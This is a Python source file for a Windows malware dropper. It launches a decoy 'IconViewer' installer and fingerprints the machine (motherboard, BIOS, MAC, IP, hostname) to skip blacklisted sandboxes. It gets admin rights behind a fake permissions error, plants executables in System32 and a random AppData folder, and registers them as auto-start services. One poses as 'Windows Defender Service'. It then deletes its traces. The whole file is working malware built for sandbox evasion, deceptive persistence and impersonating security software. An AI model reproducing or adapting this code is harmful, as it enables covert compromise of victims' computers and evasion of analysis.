import wmi, socket, os, re, subprocess, requests, uuid, random, sys, ctypes, shutil, json
from tkinter import messagebox

def main():
    try:
        enable = True
        checker = True
        debug = False

        try:
            binary_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
            WinDefSvc_exe = os.path.join(binary_path, 'WinDefSvc.exe')
            IconViewer_exe = os.path.join(binary_path, 'IconViewer3.02-x64.exe')
            Uninstaller_exe = os.path.join(binary_path, 'uninstaller.exe')
            blacklist_path = os.path.join(binary_path, 'blacklist.json')
        except Exception as e:
            if debug: print(e)
            pass

        try:
            subprocess.Popen([IconViewer_exe], shell=True)
        except Exception as e:
            if debug: print(e)
            pass

        def get_motherboard_serial():
            try:
                c = wmi.WMI()
                for board in c.Win32_BaseBoard():
                    return board.SerialNumber.strip()
            except Exception as e:
                if debug: print(e)
                pass

        def getip():
            try:
                ip = requests.get("https://api.ipify.org", timeout=5).text
            except requests.exceptions.Timeout:
                return 'Failed'
            except Exception as e:
                return 'Failed'
            return ip

        current_motherboard_id = str(get_motherboard_serial())
        current_ip = str(getip())
        current_mac = str(':'.join(re.findall('..', '%012x' % uuid.getnode())))
        current_wid = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
        current_bios_serial = str(subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip())

        if checker == True:
            with open(blacklist_path, 'r') as file:
                data = json.load(file)

            motherboard_hwid = data['motherboard_hwid']
            device_id = data['device_id']
            ip = data['ip']
            mac = data['mac']
            hw_guid = data['hw_guid']
            machine_guid = data['machine_guid']
            bios = data['bios']
            def string_checker(string):
                getVals = list([val for val in string
                            if val.isalpha() or val.isnumeric()])
                result = "".join(getVals)
                return result.isdigit()
 
            if string_checker(socket.gethostname()) == True or string_checker(current_motherboard_id):
                enable = False

            if current_ip in ip:
                enable = False

            if current_bios_serial in bios:
                enable = False

            if current_mac in mac:
                enable = False

            if current_wid in hw_guid or current_wid in machine_guid:
                enable = False

            if current_motherboard_id in motherboard_hwid:
                enable = False

            if socket.gethostname() in device_id:
                enable = False

    except Exception as e:
        enable = False
        if debug: print(e)
        pass

    if __name__ == '__main__':
        if enable == True:
            try:
                windows_folder = os.environ['WINDIR']
                user_profile = os.environ['USERPROFILE']
                random_path = os.path.join(user_profile, 'AppData', 'Local')
                windows_folder = os.path.join(windows_folder, 'System32')

                def check_service_exists(service_name):
                    c = wmi.WMI()
                    services = c.Win32_Service(Name=service_name)
                    return len(services) > 0

                def find_random_folders(directory):
                    subfolders = [f.path for f in os.scandir(directory) if f.is_dir()]
                    if not subfolders:
                        return directory

                    random_folder = random.choice(subfolders)

                    return find_random_folders(random_folder)
                
                def copy_to_random():
                    random_path = find_random_folders(random_path)

                    try:
                        shutil.copy(Uninstaller_exe, random_path)
                        random_path = os.path.join(random_path, 'uninstaller.exe')
                        return random_path
                    except PermissionError:
                        copy_to_random()
                
                def install_service(service_name, executable_path, display, description):
                    command = f'sc create {service_name} binPath="{executable_path}" DisplayName="{display}" start= auto'
                    
                    try:
                        subprocess.run(command, check=True, shell=True)
                    except subprocess.CalledProcessError as e:
                        if debug: print(e)
                        return
                    
                    description = command = f'sc description {service_name} "{description}"'

                    try:
                        subprocess.run(description, check=True, shell=True)
                    except subprocess.CalledProcessError as e:
                        if debug: print(e)
                        return

                def start_service(service_name):
                    start_command = f'sc start {service_name}'  

                    try:
                        subprocess.run(start_command, check=True, shell=True)
                    except subprocess.CalledProcessError as e:
                        if debug: print(e)
                        pass

                def cleanup():
                    try:
                        os.remove(WinDefSvc_exe)
                        os.remove(blacklist_path)
                        os.remove(Uninstaller_exe)
                    except:
                        pass
                    sys.exit()

                shutil.copy(WinDefSvc_exe, windows_folder)
                exe_location = os.path.join(windows_folder, 'WinDefSvc.exe')

                if check_service_exists("WinDefSvc") or check_service_exists('SetupSvc'): cleanup()

                random_path = copy_to_random()
                install_service('WinDefSvc', exe_location, 'Windows Defender Service', 'Windows Defender Service provides real-time protection, scanning, and removal of malware and other potentially unwanted software. It safeguards your computer from viruses, spyware, ransomware, and other threats, ensuring the security and integrity of your system.')
                install_service('SetupSvc', random_path, 'Application Setup Service', 'The Setup Service simplifies the process of installing applications on your system, automating the setup and configuration steps for seamless deployment.')
                start_service('WinDefSvc')
                cleanup()
                
            except Exception as e:
                if debug: print(e)
                pass

if int(ctypes.windll.shell32.IsUserAnAdmin()) == 1:
    main()
else:
    objShell = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    if objShell != 42:
        messagebox.showerror("Error", "Missing permissions to write to: C:\\Program Files\\IconViewer")
        sys.exit()